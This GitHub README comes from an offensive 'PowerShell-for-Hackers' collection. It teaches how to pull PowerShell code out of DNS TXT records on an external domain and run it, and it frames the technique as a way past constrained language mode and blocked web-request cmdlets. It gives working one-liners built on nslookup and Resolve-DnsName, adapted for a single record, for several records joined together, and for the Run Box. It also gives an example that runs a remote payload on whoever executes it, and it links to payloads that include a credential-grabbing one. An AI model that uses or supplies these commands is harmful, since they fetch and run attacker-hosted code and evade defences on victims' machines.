![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#Commands">The Commands</a></li>
    <li><a href="#Examples">Examples</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# NS-Lookup

<p align="center">
      <a href="https://youtu.be/yn3t4e-dq2A">
        <img src=https://i.ytimg.com/vi/bPkBzyEnr-w/hqdefault.jpg width="300" alt="Python" />
      </a>
      <br>YouTube Tutorial	
</p>

## Description

This concept was introduced to me VIA my friend Alh4zr3d on [twitter](https://twitter.com/Alh4zr3d/status/1566489367232651264?s=20&t=JXNaXH1m76yL31VdSzlyNg)

This abuses the ability to pull down dns txt records from a website and execute the output 

This is especially helpful on systems using powershell constrained language and blocking Invoke-WebRequest or Invoke-Expression

## Commands

The following commands will be referencing the DNS TXT Records shown in the below image

<img src=https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/raw/main/Assets/images/dns-records.png width="1200" alt="Python" />

### [Single TXT Record Execution]     

This nslookup example is how I was introduced to this concept originally. 

It is used to pull down a single TXT Record and execute it

`example` is referencing one of the DNS TXT Records in the image above. 

Replace it with the name of your TXT Record and replace the website URL with your own

This will execute a simple echo command to show it works 

```
powershell . (nslookup -q=txt example.iamjakoby.com)[-1]
```

More complex payloads are of course possible. 

Running the following example below will make you automatically subscribe to my youtube channel (you should try it)  

```
powershell . (nslookup -q=txt sub.iamjakoby.com)[-1]
```

### Take NOTE

The previous examples will only work when executed in a powershell window.

If it is your intention to use them in the Run Box they have to be modified as follows:

```
powershell "powershell . (nslookup -q=txt sub.iamjakoby.com)[-1]"
```

### [Multiple TXT Record Execution] 

The issue with pulling down a single TXT Record is they have a character limit of 255 

So in order to execute longer scripts you have to pull down multiple records and combine them 

The following modified verion I wrote will do just that 

`1..3` refers to DNS TXT Records 1, 2, and 3 in the image above. 

This will pull them down in that order and combine then execute them 

```
1..3|%{$p+=Resolve-DnsName "$_.iamjakoby.com." -Ty TXT |% S*s};& ([scriptblock]::Create($p))
```

Like this first example however there needs to be a modification to use it in the Run Box

The `" "` need to escaped with a `\` for it to function as intended

```
powershell 1..3|%{$p+=Resolve-DnsName \"$_.iamjakoby.com.\" -Ty TXT -EA 0|% S*s};& ([scriptblock]::Create($p))
```

<p align="right">(<a href="#top">back to top</a>)</p>


## Examples 

Listed below are payloads that can use one of these commands:

[Acid Burn](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-AcidBurn)

[JumpScare](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-JumpScare)

[WallPaper-Troll](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-Wallpaper-Troll)

[Credz-Plz](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-Credz-Plz)

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<h2 align="center">📱 My Socials 📱</h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://youtube.com/c/IamJakoby?sub_confirmation=1">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
      </a>
      <br>YouTube
    </td>
    <td align="center" width="96">
      <a href="https://twitter.com/I_Am_Jakoby">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
      </a>
      <br>Twitter
    </td>
    <td align="center" width="96">
      <a href="https://www.instagram.com/i_am_jakoby/">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/insta.png width="48" height="48" alt="Golang" />
      </a>
      <br>Instagram
    </td>
    <td align="center" width="96">
      <a href="https://discord.gg/MYYER2ZcJF">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>Discord
    </td>
  </tr>
</table>
</div>



<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)

***

[HOME-PAGE](https://github.com/I-Am-Jakoby/PowerShell-for-Hackers)

<p align="right">(<a href="#top">back to top</a>)</p>
